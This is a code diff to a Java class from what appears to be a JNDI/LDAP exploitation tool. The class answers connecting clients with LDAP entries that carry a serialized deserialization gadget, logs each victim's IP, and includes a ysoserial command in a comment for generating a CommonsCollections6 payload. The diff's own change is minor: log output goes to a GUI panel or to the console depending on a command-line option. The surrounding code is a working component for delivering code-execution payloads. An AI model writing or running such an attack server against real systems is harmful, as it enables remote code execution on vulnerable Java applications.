@@ -5,6 +5,8 @@ import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import org.apache.commons.cli.CommandLine;
+import start.ButtonPanel;
 import utools.checkPanel;
 
 import java.lang.reflect.Field;
@@ -12,11 +14,12 @@ import java.lang.reflect.Method;
 import java.net.Socket;
 import java.net.SocketAddress;
 
+import static start.ButtonPanel.cmdOptions;
+
 
 public  class SerialOperationInterceptor extends InMemoryOperationInterceptor {
 
     private byte[] gadget;
-    private checkPanel c = null;
 
     public SerialOperationInterceptor(byte[] gadget) {
         this.gadget = gadget;
@@ -46,8 +49,15 @@ public  class SerialOperationInterceptor extends InMemoryOperationInterceptor {
         socket.setAccessible(true);
         Socket socket1 = (Socket) socket.get(invoke);
         SocketAddress remoteSocketAddress = socket1.getRemoteSocketAddress();
+        String[] args = ButtonPanel.globalArgs;
+        CommandLine cmd = cmdOptions(args);
+        if (!cmd.hasOption("c")){
         checkPanel.textArea.append("\n收到ip: " + remoteSocketAddress.toString().substring(1) + " " +
                 "的请求！");
+        }else{
+            System.out.println("\n收到ip: " + remoteSocketAddress.toString().substring(1) + " " +
+                    "的请求！");
+        }
         e.addAttribute("javaClassName", "foo");
         // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
         e.addAttribute("javaSerializedData", gadget);
